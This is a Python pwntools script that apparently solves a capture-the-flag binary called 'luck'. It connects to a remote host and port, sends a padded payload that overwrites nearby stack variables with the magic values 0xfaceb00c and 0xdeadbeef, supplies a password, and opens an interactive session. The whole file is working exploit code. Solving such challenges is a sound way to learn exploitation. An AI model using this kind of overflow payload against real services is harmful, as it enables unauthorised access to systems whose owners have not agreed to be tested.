#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft

debug = 0

c = 0
pwn_file = "./luck"
elf = ELF(pwn_file)
if debug == 1:
    c = process(pwn_file)
else:
    c = remote('140.110.112.77', 2111)

context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if debug == 1:
    gdbcmd = '''
    '''

    #gdb.attach(c, gdbcmd)
    context.log_level ='debug'



c.sendlineafter("tell me:", flat({0x28 - 0x1c: p32(0xfaceb00c), 0x28 - 0x18: p32(0xdeadbeef), 0x28 - 0x14: 'aaaaaaaaaaaaaaaa'}, filler='\0'))
c.sendlineafter("password:", str(int(0x61616161)))

c.interactive()
c.close()
